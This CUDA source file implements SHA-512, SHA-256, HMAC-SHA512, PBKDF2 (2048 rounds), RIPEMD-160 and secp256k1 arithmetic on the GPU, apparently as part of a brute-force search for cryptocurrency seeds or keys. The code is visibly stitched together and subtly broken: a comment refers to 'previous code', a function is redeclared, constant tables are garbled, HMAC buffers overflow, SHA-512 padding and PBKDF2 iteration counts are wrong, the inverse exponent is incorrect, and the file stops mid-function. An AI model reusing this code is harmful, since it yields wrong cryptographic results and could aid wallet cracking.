
#include <stdint.h>
#include <string.h>
#include <cuda.h>
#include <cuda_runtime.h>

#define MAX_FOUND 1000000

// ----------------------------------------------------------------------------
// SHA‑512 (full) – needed for PBKDF2
// ----------------------------------------------------------------------------
#define ROTR64(x,n) (((x)>>(n)) | ((x)<<(64-(n))))
#define CH(x,y,z)   (((x)&(y)) ^ (~(x)&(z)))
#define MAJ(x,y,z)  (((x)&(y)) ^ ((x)&(z)) ^ ((y)&(z)))
#define SIG0(x) (ROTR64(x,28) ^ ROTR64(x,34) ^ ROTR64(x,39))
#define SIG1(x) (ROTR64(x,14) ^ ROTR64(x,18) ^ ROTR64(x,41))
#define sigma0(x) (ROTR64(x,1) ^ ROTR64(x,8) ^ ((x)>>7))
#define sigma1(x) (ROTR64(x,19) ^ ROTR64(x,61) ^ ((x)>>6))

static __constant__ uint64_t K512[80] = {
    0x428a2f98d728ae22ULL, 0x7137449123ef65cdULL, 0xb5c0fbcfec4d3b2fULL, 0xe9b5dba58189dbbcULL,
    0x3956c25bf348b538ULL, 0x59f111f1b605d019ULL, 0x923f82a4af194f9bULL, 0xab1c5ed5da6d8118ULL,
    0xd807aa98a3030242ULL, 0x12835b0145706fbeULL, 0x243185be4ee4b28cULL, 0x550c7dc3d5ffb4e2ULL,
    0x72be5d74f27b896fULL, 0x80deb1fe3b1696b1ULL, 0x9bdc06a725c71235ULL, 0xc19bf174cf692694ULL,
    0xe49b69c19ef14ad2ULL, 0xefbe4786384f25e3ULL, 0x0fc19dc68b8cd5b5ULL, 0x240ca1cc77ac9c65ULL,
    0x2de92c6f592b0275ULL, 0x4a7484aa6ea6e483ULL, 0x5cb0a9dcbd41fbd4ULL, 0x76f988da831153b5ULL,
    0x983e5152ee66dfabULL, 0xa831c66d2db43210ULL, 0xb00327c898fb213fULL, 0xbf597fc7beef0ee4ULL,
    0xc6e00bf33da88fc2ULL, 0xd5a79147930aa725ULL, 0x06ca6351e003826fULL, 0x142929670a0e6e70ULL,
    0x27b70a8546d22ffcULL, 0x2e1b21385c26c926ULL, 0x4d2c6dfc5ac42aedULL, 0x53380d139d95b3dfULL,
    0x650a73548baf63deULL, 0x766a0abb3c77b2a8ULL, 0x81c2c92e47edaee6ULL, 0x92722c851482353bULL,
    0xa2bfe8a14cf10364ULL, 0xa81a664bbc423001ULL, 0xc24b8b70d0f89791ULL, 0xc76c51a30654be30ULL,
    0xd192e819d6ef5218ULL, 0xd69906245565a910ULL, 0xf40e35855771202aULL, 0x106aa07032bbd1b8ULL,
    0x19a4c116b8d2d0c8ULL, 0x1e376c085141ab53ULL, 0x2748774cdf8eeb99ULL, 0x34b0bcb5e19b48a8ULL,
    0x391c0cb3c5c95a63ULL, 0x4ed8aa4ae3418acbULL, 0x5b9cca4f7763e373ULL, 0x682e6ff3d6b2b8a3ULL,
    0x748f82ee5defb2fcULL, 0x78a5636f43172f60ULL, 0x84c87814a1f0ab72ULL, 0x8cc702081a6439ecULL,
    0x90befffa23631e28ULL, 0xa4506cebde82bde9ULL, 0xbef9a3f7b2c67915ULL, 0xc67178f2e372532bULL,
    0xca273eceea26619cULL, 0xd186b8c721c0c207ULL, 0xeada7dd6cde0eb1eULL, 0xf57d4f7fee6ed178ULL,
    0x06f067aa72176fbaULL, 0x0a637dc5a2c898a6ULL, 0x113f9804bef90daeULL, 0x1b710b35131c471bULL,
    0x28db77f523047d84ULL, 0x32caab7b40c72493ULL, 0x3c9ebe0a15c9bebcULL, 0x431d67c49c100d4cULL,
    0x4cc5d4becb3e42b6ULL, 0x597f299cfc657e2aULL, 0x5fcb6fab3ad6faecULL, 0x6c44198c4a475817ULL
};

__device__ void sha512_transform(uint64_t *h, const uint8_t *block) {
    uint64_t w[80], a,b,c,d,e,f,g,h0;
    #pragma unroll
    for (int i=0; i<16; i++) {
        w[i] = ((uint64_t)block[i*8+0] << 56) | ((uint64_t)block[i*8+1] << 48) |
               ((uint64_t)block[i*8+2] << 40) | ((uint64_t)block[i*8+3] << 32) |
               ((uint64_t)block[i*8+4] << 24) | ((uint64_t)block[i*8+5] << 16) |
               ((uint64_t)block[i*8+6] << 8)  | ((uint64_t)block[i*8+7]);
    }
    for (int i=16; i<80; i++)
        w[i] = sigma1(w[i-2]) + w[i-7] + sigma0(w[i-15]) + w[i-16];
    a = h[0]; b = h[1]; c = h[2]; d = h[3];
    e = h[4]; f = h[5]; g = h[6]; h0 = h[7];
    #pragma unroll
    for (int i=0; i<80; i++) {
        uint64_t t1 = h0 + SIG1(e) + CH(e,f,g) + K512[i] + w[i];
        uint64_t t2 = SIG0(a) + MAJ(a,b,c);
        h0 = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
    }
    h[0] += a; h[1] += b; h[2] += c; h[3] += d;
    h[4] += e; h[5] += f; h[6] += g; h[7] += h0;
}

__device__ void sha512_hash(const uint8_t *in, size_t len, uint8_t out[64]) {
    uint64_t h[8] = {0x6a09e667f3bcc908ULL, 0xbb67ae8584caa73bULL,
                     0x3c6ef372fe94f82bULL, 0xa54ff53a5f1d36f1ULL,
                     0x510e527fade682d1ULL, 0x9b05688c2b3e6c1fULL,
                     0x1f83d9abfb41bd6bULL, 0x5be0cd19137e2179ULL};
    uint8_t buf[128];
    size_t idx = 0;
    while (len >= 128) {
        sha512_transform(h, in + idx);
        idx += 128; len -= 128;
    }
    memcpy(buf, in + idx, len);
    buf[len] = 0x80;
    size_t pad = 128 - len - 9;
    for (size_t i = len+1; i < len+1+pad; i++) buf[i] = 0;
    uint64_t bits = (idx + len) * 8;
    for (int i=0; i<8; i++) buf[127-i] = (uint8_t)(bits >> (8*i));
    sha512_transform(h, buf);
    for (int i=0; i<8; i++) {
        out[i*8+0] = (uint8_t)(h[i] >> 56);
        out[i*8+1] = (uint8_t)(h[i] >> 48);
        out[i*8+2] = (uint8_t)(h[i] >> 40);
        out[i*8+3] = (uint8_t)(h[i] >> 32);
        out[i*8+4] = (uint8_t)(h[i] >> 24);
        out[i*8+5] = (uint8_t)(h[i] >> 16);
        out[i*8+6] = (uint8_t)(h[i] >> 8);
        out[i*8+7] = (uint8_t)(h[i]);
    }
}

// ----------------------------------------------------------------------------
// SHA‑256 (full)
// ----------------------------------------------------------------------------
#define ROTR32(x,n) (((x)>>(n)) | ((x)<<(32-(n))))
#define CH32(x,y,z) (((x)&(y)) ^ (~(x)&(z)))
#define MAJ32(x,y,z) (((x)&(y)) ^ ((x)&(z)) ^ ((y)&(z)))
#define EP0(x) (ROTR32(x,2) ^ ROTR32(x,13) ^ ROTR32(x,22))
#define EP1(x) (ROTR32(x,6) ^ ROTR32(x,11) ^ ROTR32(x,25))
#define SIG0_32(x) (ROTR32(x,7) ^ ROTR32(x,18) ^ ((x)>>3))
#define SIG1_32(x) (ROTR32(x,17) ^ ROTR32(x,19) ^ ((x)>>10))

static __constant__ uint32_t K256[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

__device__ void sha256_transform(uint32_t *h, const uint8_t *block) {
    uint32_t w[64], a,b,c,d,e,f,g,h0;
    #pragma unroll
    for (int i=0; i<16; i++) {
        w[i] = ((uint32_t)block[i*4+0] << 24) | ((uint32_t)block[i*4+1] << 16) |
               ((uint32_t)block[i*4+2] << 8)  | ((uint32_t)block[i*4+3]);
    }
    for (int i=16; i<64; i++)
        w[i] = SIG1_32(w[i-2]) + w[i-7] + SIG0_32(w[i-15]) + w[i-16];
    a = h[0]; b = h[1]; c = h[2]; d = h[3];
    e = h[4]; f = h[5]; g = h[6]; h0 = h[7];
    #pragma unroll
    for (int i=0; i<64; i++) {
        uint32_t t1 = h0 + EP1(e) + CH32(e,f,g) + K256[i] + w[i];
        uint32_t t2 = EP0(a) + MAJ32(a,b,c);
        h0 = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
    }
    h[0] += a; h[1] += b; h[2] += c; h[3] += d;
    h[4] += e; h[5] += f; h[6] += g; h[7] += h0;
}

__device__ void sha256_hash(const uint8_t *in, size_t len, uint8_t out[32]) {
    uint32_t h[8] = {0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
                     0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19};
    uint8_t buf[64];
    size_t idx = 0;
    while (len >= 64) {
        sha256_transform(h, in + idx);
        idx += 64; len -= 64;
    }
    memcpy(buf, in + idx, len);
    buf[len] = 0x80;
    size_t pad = 64 - len - 9;
    for (size_t i = len+1; i < len+1+pad; i++) buf[i] = 0;
    uint64_t bits = (idx + len) * 8;
    for (int i=0; i<8; i++) buf[63-i] = (uint8_t)(bits >> (8*i));
    sha256_transform(h, buf);
    for (int i=0; i<8; i++) {
        out[i*4+0] = (uint8_t)(h[i] >> 24);
        out[i*4+1] = (uint8_t)(h[i] >> 16);
        out[i*4+2] = (uint8_t)(h[i] >> 8);
        out[i*4+3] = (uint8_t)(h[i]);
    }
}

// ----------------------------------------------------------------------------
// HMAC-SHA512 (used by PBKDF2)
// ----------------------------------------------------------------------------
__device__ void hmac_sha512(const uint8_t *key, size_t keylen,
                            const uint8_t *msg, size_t msglen,
                            uint8_t out[64]) {
    uint8_t k_ipad[128], k_opad[128];
    uint8_t k0[128];
    if (keylen > 128) {
        sha512_hash(key, keylen, k0);
        keylen = 64;
    } else {
        memcpy(k0, key, keylen);
    }
    for (int i=0; i<128; i++) {
        k_ipad[i] = (i < keylen) ? k0[i] ^ 0x36 : 0x36;
        k_opad[i] = (i < keylen) ? k0[i] ^ 0x5c : 0x5c;
    }
    uint8_t inner[128];
    memcpy(inner, k_ipad, 128);
    memcpy(inner + 128, msg, msglen);
    uint8_t inner_hash[64];
    sha512_hash(inner, 128 + msglen, inner_hash);
    uint8_t outer[192];
    memcpy(outer, k_opad, 128);
    memcpy(outer + 128, inner_hash, 64);
    sha512_hash(outer, 128 + 64, out);
}

// ----------------------------------------------------------------------------
// PBKDF2-HMAC-SHA512 (2048 iterations, unrolled 16)
// ----------------------------------------------------------------------------
__device__ void pbkdf2_hmac_sha512_unrolled(const uint8_t *pass, size_t passlen,
                                            const uint8_t *salt, size_t saltlen,
                                            uint32_t iterations,
                                            uint8_t *out, size_t outlen) {
    uint8_t dk[64];
    uint8_t salt_with_counter[128];
    memcpy(salt_with_counter, salt, saltlen);
    salt_with_counter[saltlen+0] = 0;
    salt_with_counter[saltlen+1] = 0;
    salt_with_counter[saltlen+2] = 0;
    salt_with_counter[saltlen+3] = 1;
    hmac_sha512(pass, passlen, salt_with_counter, saltlen+4, dk);
    memcpy(out, dk, 64);
    #pragma unroll 16
    for (uint32_t i = 1; i < iterations; i += 16) {
        #pragma unroll 16
        for (int u = 0; u < 16; u++) {
            hmac_sha512(pass, passlen, dk, 64, dk);
            #pragma unroll
            for (int j=0; j<64; j++) out[j] ^= dk[j];
        }
    }
}

// ----------------------------------------------------------------------------
// RIPEMD-160 (full)
// ----------------------------------------------------------------------------
static inline __device__ uint32_t rol32(uint32_t x, unsigned n) {
    return (x << n) | (x >> (32 - n));
}
static inline __device__ uint32_t f1(uint32_t x, uint32_t y, uint32_t z) { return x ^ y ^ z; }
static inline __device__ uint32_t f2(uint32_t x, uint32_t y, uint32_t z) { return (x & y) | (~x & z); }
static inline __device__ uint32_t f3(uint32_t x, uint32_t y, uint32_t z) { return (x | ~y) ^ z; }
static inline __device__ uint32_t f4(uint32_t x, uint32_t y, uint32_t z) { return (x & z) | (y & ~z); }
static inline __device__ uint32_t f5(uint32_t x, uint32_t y, uint32_t z) { return x ^ (y | ~z); }

static const uint32_t K1[16] = {
    0x00000000, 0x5A827999, 0x6ED9EBA1, 0x8F1BBCDC, 0xA953FD4E, 0x50A28BE6, 0x5C4DD124, 0x6D703EF3,
    0x7A6D76E9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000
};
static const uint32_t K2[16] = {
    0x50A28BE6, 0x5C4DD124, 0x6D703EF3, 0x7A6D76E9, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000
};
static const uint32_t K3[16] = {
    0x6D703EF3, 0x7A6D76E9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000
};
static const uint32_t K4[16] = {
    0x7A6D76E9, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000
};

static __constant__ uint32_t rl[80] = {
    0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
    7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,
    3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,
    1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,
    4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13
};
static __constant__ uint32_t rr[80] = {
    5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,
    6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,
    15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,
    8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,
    12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11
};
static __constant__ uint32_t sl[80] = {
    11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,
    7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,
    11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,
    11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,
    9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6
};
static __constant__ uint32_t sr[80] = {
    8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,
    9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,
    9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,
    15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,
    8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11
};
static __constant__ uint32_t kl[80] = {
    0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,
    0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,
    0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,
    0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,0x5A827999,
    0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,
    0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,0x6ED9EBA1,
    0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,
    0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,0x8F1BBCDC,
    0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,
    0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E,0xA953FD4E
};
static __constant__ uint32_t kr[80] = {
    0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,
    0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,0x50A28BE6,
    0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,
    0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,0x5C4DD124,
    0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,
    0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,0x6D703EF3,
    0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,
    0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,0x7A6D76E9,
    0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,
    0x00000000,0x00000000,0x00000000,0x00000000,0x00000000,0x00000000
};

__device__ void ripemd160_compress(uint32_t *h, const uint8_t *block) {
    uint32_t x[16];
    #pragma unroll
    for (int i=0; i<16; i++) {
        x[i] = ((uint32_t)block[i*4+0] << 0) | ((uint32_t)block[i*4+1] << 8) |
               ((uint32_t)block[i*4+2] << 16) | ((uint32_t)block[i*4+3] << 24);
    }
    uint32_t a = h[0], b = h[1], c = h[2], d = h[3], e = h[4];
    uint32_t aa = a, bb = b, cc = c, dd = d, ee = e;

    
    #pragma unroll
    for (int j=0; j<80; j++) {
        uint32_t tl, tr;
        if (j < 16) {
            tl = rol32(a + f1(b,c,d) + x[rl[j]] + kl[j], sl[j]) + e;
            tr = rol32(aa + f5(bb,cc,dd) + x[rr[j]] + kr[j], sr[j]) + ee;
        } else if (j < 32) {
            tl = rol32(a + f2(b,c,d) + x[rl[j]] + kl[j], sl[j]) + e;
            tr = rol32(aa + f4(bb,cc,dd) + x[rr[j]] + kr[j], sr[j]) + ee;
        } else if (j < 48) {
            tl = rol32(a + f3(b,c,d) + x[rl[j]] + kl[j], sl[j]) + e;
            tr = rol32(aa + f3(bb,cc,dd) + x[rr[j]] + kr[j], sr[j]) + ee;
        } else if (j < 64) {
            tl = rol32(a + f4(b,c,d) + x[rl[j]] + kl[j], sl[j]) + e;
            tr = rol32(aa + f2(bb,cc,dd) + x[rr[j]] + kr[j], sr[j]) + ee;
        } else {
            tl = rol32(a + f5(b,c,d) + x[rl[j]] + kl[j], sl[j]) + e;
            tr = rol32(aa + f1(bb,cc,dd) + x[rr[j]] + kr[j], sr[j]) + ee;
        }
        a = e; e = d; d = rol32(c, 10); c = b; b = tl;
        aa = ee; ee = dd; dd = rol32(cc, 10); cc = bb; bb = tr;
    }
    uint32_t t = h[1] + c + dd;
    h[1] = h[2] + d + ee;
    h[2] = h[3] + e + aa;
    h[3] = h[4] + a + bb;
    h[4] = h[0] + b + cc;
    h[0] = t;
}

__device__ void ripemd160_hash(const uint8_t *in, size_t len, uint8_t out[20]) {
    uint32_t h[5] = {0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0};
    uint8_t buf[64];
    size_t idx = 0;
    while (len >= 64) {
        ripemd160_compress(h, in + idx);
        idx += 64; len -= 64;
    }
    memcpy(buf, in + idx, len);
    buf[len] = 0x80;
    size_t pad = 64 - len - 9;
    for (size_t i = len+1; i < len+1+pad; i++) buf[i] = 0;
    uint64_t bits = (idx + len) * 8;
    for (int i=0; i<8; i++) buf[63-i] = (uint8_t)(bits >> (8*i));
    ripemd160_compress(h, buf);
    for (int i=0; i<5; i++) {
        out[i*4+0] = (uint8_t)(h[i] >> 0);
        out[i*4+1] = (uint8_t)(h[i] >> 8);
        out[i*4+2] = (uint8_t)(h[i] >> 16);
        out[i*4+3] = (uint8_t)(h[i] >> 24);
    }
}

// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// FULL secp256k1 modular multiplication with correct reduction
// Replace the placeholder mod_mul in the previous code with this version.
// ----------------------------------------------------------------------------

#define P0 0xFFFFFFFFFFFFFFFFULL
#define P1 0xFFFFFFFFFFFFFFFEULL
#define P2 0xFFFFFFFFFFFFFFFFULL
#define P3 0xFFFFFFFFFFFFFFFFULL   // p = 2^256 - 2^32 - 2^9 - 2^8 - 2^7 - 2^6 - 2^4 - 1

// ----------------------------------------------------------------------------
// Modular arithmetic modulo p (secp256k1 prime)
// p = 2^256 - 2^32 - 2^9 - 2^8 - 2^7 - 2^6 - 2^4 - 1
// ----------------------------------------------------------------------------
__device__ void mod_norm(uint64_t *r) {
    if (r[3] > P3 || (r[3] == P3 && r[2] > P2) ||
        (r[3] == P3 && r[2] == P2 && r[1] > P1) ||
        (r[3] == P3 && r[2] == P2 && r[1] == P1 && r[0] >= P0)) {
        uint64_t borrow = 0;
        for (int i=0; i<4; i++) {
            uint64_t sub = (i==0) ? P0 : (i==1) ? P1 : (i==2) ? P2 : P3;
            uint64_t diff = r[i] - sub - borrow;
            r[i] = diff;
            borrow = (diff > r[i]) || (diff == r[i] && borrow);
        }
    }
}

__device__ void mod_add(uint64_t *r, const uint64_t *a, const uint64_t *b) {
    uint64_t carry = 0;
    for (int i=0; i<4; i++) {
        uint64_t sum = a[i] + b[i] + carry;
        r[i] = sum;
        carry = (sum < a[i]) || (sum == a[i] && carry);
    }
    if (carry) {
        uint64_t borrow = 0;
        for (int i=0; i<4; i++) {
            uint64_t sub = (i==0) ? P0 : (i==1) ? P1 : (i==2) ? P2 : P3;
            uint64_t diff = r[i] - sub - borrow;
            r[i] = diff;
            borrow = (diff > r[i]) || (diff == r[i] && borrow);
        }
    } else {
        mod_norm(r);
    }
}

__device__ void mod_sub(uint64_t *r, const uint64_t *a, const uint64_t *b) {
    uint64_t borrow = 0;
    for (int i=0; i<4; i++) {
        uint64_t diff = a[i] - b[i] - borrow;
        r[i] = diff;
        borrow = (diff > a[i]) || (diff == a[i] && borrow);
    }
    if (borrow) {
        uint64_t carry = 0;
        for (int i=0; i<4; i++) {
            uint64_t add = (i==0) ? P0 : (i==1) ? P1 : (i==2) ? P2 : P3;
            uint64_t sum = r[i] + add + carry;
            r[i] = sum;
            carry = (sum < r[i]) || (sum == r[i] && carry);
        }
    }
}

// Reduction: if r >= p, subtract p (already defined in original code)
__device__ void mod_norm(uint64_t *r);

// ------------------------------------------------------------
// Core multiplication + reduction (secp256k1-style)
// ------------------------------------------------------------
__device__ void mod_mul(uint64_t *r, const uint64_t *a, const uint64_t *b) {
    // Use 32‑bit splits to multiply two 64‑bit numbers -> 128‑bit result
    #define MUL64_128(a, b, lo, hi) do { \
        uint32_t a_lo = (uint32_t)(a); \
        uint32_t a_hi = (uint32_t)((a) >> 32); \
        uint32_t b_lo = (uint32_t)(b); \
        uint32_t b_hi = (uint32_t)((b) >> 32); \
        uint64_t p0 = (uint64_t)a_lo * b_lo; \
        uint64_t p1 = (uint64_t)a_lo * b_hi; \
        uint64_t p2 = (uint64_t)a_hi * b_lo; \
        uint64_t p3 = (uint64_t)a_hi * b_hi; \
        uint64_t carry = 0; \
        uint64_t sum0 = p0 + ((p1 & 0xFFFFFFFFULL) << 32); \
        carry = (sum0 < p0) ? 1ULL : 0ULL; \
        uint64_t sum1 = (p1 >> 32) + (p2 & 0xFFFFFFFFULL) + carry; \
        carry = (sum1 < (p1 >> 32)) ? 1ULL : 0ULL; \
        uint64_t sum2 = (p2 >> 32) + p3 + carry; \
        (lo) = sum0; \
        (hi) = (sum1 << 32) | (sum2 & 0xFFFFFFFFULL); \
    } while(0)

    // 1. Schoolbook multiplication using the portable macro
    uint64_t t[8] = {0};
    for (int i = 0; i < 4; i++) {
        uint64_t carry = 0;
        for (int j = 0; j < 4; j++) {
            uint64_t lo, hi;
            MUL64_128(a[i], b[j], lo, hi);
            uint64_t sum = t[i+j] + lo + carry;
            carry = (sum < t[i+j]) || (sum < lo) || (sum < carry);
            t[i+j] = sum;
            uint64_t sum2 = t[i+j+1] + hi + carry;
            carry = (sum2 < t[i+j+1]) || (sum2 < hi) || (sum2 < carry);
            t[i+j+1] = sum2;
        }
        if (carry) {
            uint64_t sum3 = t[i+4] + carry;
            carry = (sum3 < t[i+4]) || (sum3 < carry);
            t[i+4] = sum3;
            if (carry) t[i+5] += carry;
        }
    }

    // 2. Reduction modulo p = 2^256 - 2^32 - 2^9 - 2^8 - 2^7 - 2^6 - 2^4 - 1
    //    Use the same portable macro for multiplying high limbs by 0x1000003D1
    uint64_t carry = 0;
    for (int i = 4; i < 8; i++) {
        uint64_t m = t[i];
        if (m == 0) continue;
        uint64_t lo, hi;
        MUL64_128(m, 0x3D1ULL, lo, hi);   // m * 0x3D1
        uint64_t high_part = hi + (m << 32); // add m * 2^32
        // Add lo to t[0], high_part to t[1]
        uint64_t sum = t[0] + lo;
        carry = (sum < t[0]) || (sum < lo);
        t[0] = sum;
        sum = t[1] + high_part + carry;
        carry = (sum < t[1]) || (sum < high_part) || (sum < carry);
        t[1] = sum;
        for (int j = 2; j < 4; j++) {
            sum = t[j] + carry;
            carry = (sum < t[j]) || (sum < carry);
            t[j] = sum;
        }
        // If carry propagates beyond t[3], add it back
        while (carry) {
            MUL64_128(carry, 0x3D1ULL, lo, hi);
            high_part = hi + (carry << 32);
            sum = t[0] + lo;
            carry = (sum < t[0]) || (sum < lo);
            t[0] = sum;
            sum = t[1] + high_part + carry;
            carry = (sum < t[1]) || (sum < high_part) || (sum < carry);
            t[1] = sum;
            for (int j = 2; j < 4; j++) {
                sum = t[j] + carry;
                carry = (sum < t[j]) || (sum < carry);
                t[j] = sum;
            }
        }
        t[i] = 0; // clear reduced limb
    }

    // 3. Copy low 4 limbs to r and normalize
    memcpy(r, t, 32);
    mod_norm(r);

    #undef MUL64_128
}

__device__ void mod_inv(uint64_t *r, const uint64_t *a) {
    // Fermat's little theorem: a^(p-2) mod p
    uint64_t e[4] = {0xFFFFFC2D, 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFF};
    uint64_t base[4], res[4] = {1,0,0,0};
    memcpy(base, a, 32);
    for (int i=0; i<256; i++) {
        if ((e[i>>6] >> (i&63)) & 1)
            mod_mul(res, res, base);
        mod_mul(base, base, base);
    }
    memcpy(r, res, 32);
}

// Jacobian point structure: X,Y,Z each 4 limbs
typedef uint64_t jacobian[4][3];

__device__ void jac_double(jacobian r, const jacobian a);
__device__ void jac_add_mixed(jacobian r, const jacobian a, const uint64_t *b_aff) {
    uint64_t z1z1[4], u[4], s[4], h[4], hh[4], hhh[4], t[4];
    mod_mul(z1z1, a[2], a[2]);
    memcpy(u, a[0], 32);
    memcpy(s, a[1], 32);
    mod_sub(h, u, b_aff);
    mod_sub(t, s, b_aff + 4);
    int h_zero = 1;
    for (int i=0; i<4; i++) if (h[i]) { h_zero = 0; break; }
    if (h_zero) {
    int t_zero = 1;
    for (int i=0; i<4; i++) if (t[i]) { t_zero = 0; break; }
    if (t_zero) {
        // P = Q → doubling
        jac_double(r, a);
        return;
    } else {
        // P = -Q → infinity
        for (int i=0; i<4; i++) { r[0][i]=r[1][i]=r[2][i]=0; }
        return;
    }
}
    mod_mul(hh, h, h);
    mod_mul(hhh, h, hh);
    uint64_t uhh[4]; mod_mul(uhh, u, hh);
    mod_add(uhh, uhh, uhh);
    uint64_t t2[4]; mod_mul(t2, t, t);
    mod_sub(r[0], t2, hhh);
    mod_sub(r[0], r[0], uhh);
    uint64_t uhh_minus_x[4]; mod_sub(uhh_minus_x, uhh, r[0]);
    uint64_t tmp[4]; mod_mul(tmp, t, uhh_minus_x);
    uint64_t shhh[4]; mod_mul(shhh, s, hhh);
    mod_sub(r[1], tmp, shhh);
    mod_mul(r[2], a[2], h);
}

__device__ void jac_double(jacobian r, const jacobian a) {
    uint64_t x3[4], y3[4], z3[4];
    uint64_t t0[4], t1[4], t2[4], t3[4];
    int infinity = 1;
    for (int i=0; i<4; i++) if (a[2][i]) { infinity = 0; break; }
    if (infinity) {
        for (int i=0; i<4; i++) { r[0][i]=r[1][i]=r[2][i]=0; }
        return;
    }
    mod_mul(t0, a[0], a[0]); // X^2
    uint64_t t0_2[4]; mod_add(t0_2, t0, t0);
    mod_add(t0, t0_2, t0); // 3X^2
    mod_mul(t1, a[1], a[1]); // Y^2
    mod_mul(t1, t1, a[0]);   // X*Y^2
    mod_add(t1, t1, t1);
    mod_add(t1, t1, t1); // 4X*Y^2
    mod_mul(z3, a[1], a[2]);
    mod_add(z3, z3, z3); // 2Y*Z
